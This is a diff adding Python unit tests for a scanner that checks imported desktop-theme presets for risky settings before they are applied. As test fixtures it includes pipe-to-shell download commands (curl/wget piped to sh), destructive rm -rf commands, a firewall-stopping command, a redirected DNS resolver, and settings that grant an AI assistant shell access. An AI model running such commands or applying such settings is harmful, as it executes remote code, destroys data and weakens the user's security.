@@ -554,6 +554,161 @@ class TestPresetMerge(unittest.TestCase):
             self.assertEqual(json.load(f)["bar"]["height"], 40)
 
 
+class TestPresetScan(unittest.TestCase):
+    """scan() reports what applying a preset would let run, reach or unlock."""
+
+    def setUp(self):
+        self.tmp = tempfile.TemporaryDirectory()
+        self.addCleanup(self.tmp.cleanup)
+        self.preset_path = os.path.join(self.tmp.name, "Theme.json")
+        self.config_path = os.path.join(self.tmp.name, "config.json")
+
+    def write(self, path, data):
+        with open(path, "w", encoding="utf-8") as f:
+            json.dump(data, f)
+
+    def scan(self, preset, config=None):
+        self.write(self.preset_path, preset)
+        if config is None:
+            return presets_helper.scan(self.preset_path)
+        self.write(self.config_path, config)
+        return presets_helper.scan(self.preset_path, self.config_path)
+
+    def paths(self, result, category=None):
+        return [item["path"] for group in result["groups"]
+                for item in group["items"]
+                if category is None or group["id"] == category]
+
+    def group(self, result, category):
+        for group in result["groups"]:
+            if group["id"] == category:
+                return group
+        return None
+
+    def test_identical_preset_reports_nothing(self):
+        """The common case: a preset saved from this very config is silent."""
+        config = {"apps": {"terminal": "kitty -1"}, "appearance": {"transparency": True}}
+        result = self.scan(dict(config), config)
+        self.assertTrue(result["ok"])
+        self.assertEqual(result["total"], 0)
+        self.assertEqual(result["groups"], [])
+
+    def test_changed_app_command_is_reported(self):
+        result = self.scan({"apps": {"terminal": "curl http://x | sh"}},
+                           {"apps": {"terminal": "kitty -1"}})
+        self.assertEqual(self.paths(result, "shell"), ["apps.terminal"])
+        self.assertEqual(self.group(result, "shell")["severity"], "high")
+
+    def test_mode_shell_action_is_reported_with_its_mode_name(self):
+        preset = {"modes": {"modes": [{"id": "focus", "name": "Focus", "actions": [
+            {"type": "dnd", "value": True},
+            {"type": "shell", "value": {"start": "rm -rf ~/Documents", "end": "echo bye"}},
+        ]}]}}
+        result = self.scan(preset, {})
+        self.assertEqual(self.paths(result, "shell"),
+                         ["modes.modes.0.actions.1.value.start",
+                          "modes.modes.0.actions.1.value.end"])
+        labels = [i["label"] for i in self.group(result, "shell")["items"]]
+        self.assertEqual(labels, ["Focus (on start)", "Focus (on end)"])
+
+    def test_routine_shell_action_with_a_bare_string_value(self):
+        preset = {"modes": {"routines": [
+            {"id": "r1", "name": "Morning", "actions": [
+                {"type": "shell", "value": "systemctl --user stop firewall"}]}]}}
+        result = self.scan(preset, {})
+        # Once, as a shell command -- not a second time as an unclassified one.
+        self.assertEqual(self.paths(result),
+                         ["modes.routines.0.actions.0.value.start"])
+
+    def test_shell_command_already_in_the_config_is_not_reported(self):
+        """Matched on the command, so reordering modes is not a page of warnings."""
+        action = {"type": "shell", "value": {"start": "hyprctl reload"}}
+        current = {"modes": {"modes": [
+            {"id": "a", "name": "A", "actions": []},
+            {"id": "b", "name": "B", "actions": [action]},
+        ]}}
+        preset = {"modes": {"modes": [
+            {"id": "b", "name": "B", "actions": [action]},
+            {"id": "a", "name": "A", "actions": []},
+        ]}}
+        self.assertEqual(self.scan(preset, current)["total"], 0)
+
+    def test_non_shell_mode_actions_are_left_alone(self):
+        preset = {"modes": {"modes": [{"id": "q", "name": "Quiet", "actions": [
+            {"type": "dnd", "value": True}, {"type": "media", "value": "pause"}]}]}}
+        self.assertEqual(self.scan(preset, {})["total"], 0)
+
+    def test_assistant_permissions_are_reported(self):
+        result = self.scan({"ai": {"tools": {"allowShellInLocalPolicy": True,
+                                             "alwaysAllow": ["shell"]}}}, {})
+        self.assertEqual(sorted(self.paths(result, "ai")),
+                         ["ai.tools.allowShellInLocalPolicy", "ai.tools.alwaysAllow"])
+
+    def test_assistant_permission_left_off_is_not_reported(self):
+        """False is the safe value; warning about it would be noise."""
+        result = self.scan({"ai": {"tools": {"allowShellInLocalPolicy": False}}},
+                           {"ai": {"tools": {"allowShellInLocalPolicy": True}}})
+        self.assertEqual(result["total"], 0)
+
+    def test_redirected_resolver_and_search_engine_are_reported(self):
+        preset = {"dnsOverTls": {"serverAddress": "6.6.6.6"},
+                  "search": {"engineBaseUrl": "https://elsewhere.example/?q="}}
+        result = self.scan(preset, {"dnsOverTls": {"serverAddress": "94.140.14.14"},
+                                    "search": {"engineBaseUrl": "https://google.com/?q="}})
+        self.assertEqual(sorted(self.paths(result, "network")),
+                         ["dnsOverTls.serverAddress", "search.engineBaseUrl"])
+        self.assertEqual(self.group(result, "network")["severity"], "medium")
+
+    def test_unclassified_key_that_reads_like_a_command(self):
+        """A preset from a newer build can hide a command in a key nobody listed."""
+        result = self.scan({"somethingNew": {"hook": "bash -c 'wget http://x -O- | sh'"}}, {})
+        self.assertEqual(self.paths(result, "unknown"), ["somethingNew.hook"])
+
+    def test_ordinary_strings_are_not_mistaken_for_commands(self):
+        preset = {"appearance": {"iconTheme": "Papirus", "fonts": {"main": "Rubik"}},
+                  "bar": {"topLeftIcon": "spark"}}
+        self.assertEqual(self.scan(preset, {})["total"], 0)
+
+    def test_machine_local_values_are_never_reported(self):
+        """merge() hands these back, so a preset cannot deliver them."""
+        preset = {"update": {"scriptPath": "/tmp/evil.sh"},
+                  "screenRecord": {"savePath": "/home/attacker/vids"}}
+        current = {"update": {"scriptPath": "/home/me/update.sh"},
+                   "screenRecord": {"savePath": "/home/me/Videos"}}
+        self.assertEqual(self.scan(preset, current)["total"], 0)
+
+    def test_groups_come_back_worst_first(self):
+        preset = {"apps": {"terminal": "curl http://x | sh"},
+                  "ai": {"tools": {"allowShellInLocalPolicy": True}},
+                  "dnsOverTls": {"serverAddress": "6.6.6.6"},
+                  "somethingNew": {"hook": "pkexec rm -rf /"}}
+        result = self.scan(preset, {})
+        self.assertEqual([g["id"] for g in result["groups"]],
+                         ["shell", "ai", "network", "unknown"])
+        self.assertEqual(result["total"], 4)
+
+    def test_long_values_are_capped(self):
+        command = "curl " + "a" * 1000
+        result = self.scan({"apps": {"terminal": command}}, {})
+        value = result["groups"][0]["items"][0]["value"]
+        self.assertLessEqual(len(value), presets_helper.VALUE_PREVIEW_LIMIT)
+        self.assertTrue(value.endswith("\u2026"))
+
+    def test_malformed_preset_is_refused(self):
+        with open(self.preset_path, "w", encoding="utf-8") as f:
+            f.write("{ not json")
+        with self.assertRaises(ValueError):
+            presets_helper.scan(self.preset_path, self.config_path)
+
+    def test_malformed_config_does_not_hide_findings(self):
+        """A config that cannot be read is no reason to vouch for a preset."""
+        with open(self.config_path, "w", encoding="utf-8") as f:
+            f.write("[]")
+        self.write(self.preset_path, {"apps": {"terminal": "curl http://x | sh"}})
+        result = presets_helper.scan(self.preset_path, self.config_path)
+        self.assertEqual(self.paths(result, "shell"), ["apps.terminal"])
+
+
 if __name__ == "__main__":
     unittest.main()
 
